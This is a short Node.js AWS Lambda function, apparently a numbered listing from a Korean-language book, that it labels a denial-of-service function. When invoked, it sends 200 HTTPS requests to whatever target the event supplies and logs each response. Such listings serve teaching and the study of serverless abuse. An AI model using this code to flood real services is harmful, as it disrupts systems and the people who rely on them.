// 목록 7.7 denial-of-service Lambda 함수

'use strict';

let https = require('https');

function makeRequests(event, iteration, callback) {

  const req = https.request(event.options, (res) => {
    let body = '';
    console.log('Status:', res.statusCode);
    res.setEncoding('utf8');
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
      console.log('Successfully processed HTTPS response, iteration: ', iteration);

      if (res.headers['content-type'] === 'application/json') {
	console.log(JSON.parse(body));
      }
    });
  });
  return req;
}

exports.handler = (event, context, callback) => {
  for (var i = 0; i < 200; i++) {
    var req = makeRequests(event, i, callback);
    req.end();
  }
};
